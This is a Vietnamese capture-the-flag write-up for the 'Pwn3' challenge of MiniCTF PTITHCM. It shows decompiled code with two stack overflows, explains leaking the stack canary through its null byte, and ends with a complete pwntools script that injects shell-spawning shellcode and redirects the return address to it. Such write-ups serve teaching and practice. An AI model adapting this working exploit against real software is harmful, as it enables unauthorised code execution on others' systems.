---
title: "Pwn3 - MiniCTF - PTITHCM"
date: 2024-01-05 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, ret2shellcode, canary-leak, stack-overflow, ptithcm]
author: datious
description: "MiniCTF PTITHCM Pwn3 writeup — ret2shellcode với canary leak bypass trên một binary có Canary bật."
---

# Pwn3 - MiniCTF - PTITHCM
**Author: D1n0_09-N24DCAT015**

Đầu tiên server sẽ cho ta 1 file có tên `ret2shellcode` → Dự đoán khai thác bằng cách overwrite save RIP để return vào shellcode.

## 1. Tổng quát về file thực thi

Dùng **Ghidra** để decompile:

```c
void main(void)
{
  long in_FS_OFFSET;
  undefined1 local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("%p", local_118);       // leak địa chỉ stack
  printf("\nWelcome to our CTF");
  printf("\nTo play our CTF, please register an account:");
  printf("\nPlease enter your username: ");
  fflush(stdout);
  hehe();
  read(0, local_118, 0x10a);    // 266 bytes → overflow (buffer chỉ 264 bytes)
  printf("Your user name: %s", local_118);
  printf("\nEnter your password: ");
  memset(local_118, 0, 0x100);
  fflush(stdout);
  read(0, local_118, 0x120);    // 288 bytes → overflow
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

→ Buffer overflow ở **cả 2 hàm `read()`**.

## 2. Security Layers

![Checksec](https://hackmd.io/_uploads/rkdXmZQebg.png)

→ **Canary enabled** → không thể trực tiếp overwrite save RIP.

## 3. Khai thác

### Leak Canary

- Lần nhập đầu tiên cho nhập **266 bytes** vào buffer 264 bytes.
- Canary có **null byte đầu tiên** (byte thấp = `\x00`), nằm phía trên save RBP.
- Nếu ta nhập **265 bytes** (ghi đè 1 byte null của canary thành `A`), thì `printf("%s", local_118)` sẽ in tiếp đến canary, leak được **7 byte còn lại** của canary.

![Canary leak](https://hackmd.io/_uploads/BJAoN-7ebg.png)

→ Canary đã bị leak! Khôi phục bằng cách ghép lại `\x00` + 7 bytes vừa đọc.

### Shellcode

- Chương trình cung cấp địa chỉ stack của `local_118` khi chạy (`printf("%p", local_118)`).

![Stack address](https://hackmd.io/_uploads/SJJZ8bXxWx.png)

### Payload (lần nhập 2)

```python
from pwn import *

p = process('./ret2shellcode')

# Lần 1: leak canary
p.recvuntil("0x")
buf_addr = int(p.recv(12), 16)
log.info(f"buf @ {hex(buf_addr)}")

payload1 = b'A' * 265
p.sendafter("username: ", payload1)

p.recvuntil("A" * 265)
canary = u64(b'\x00' + p.read(7))
log.info(f"canary = {hex(canary)}")

# Lần 2: shellcode + canary + RIP
shellcode = asm(shellcraft.sh())
payload2  = shellcode.ljust(264, b'A')   # pad đến canary offset
payload2 += p64(canary)
payload2 += p64(0)                        # rbp
payload2 += p64(buf_addr)                 # rip → shellcode

p.sendafter("password: ", payload2)
p.interactive()
```
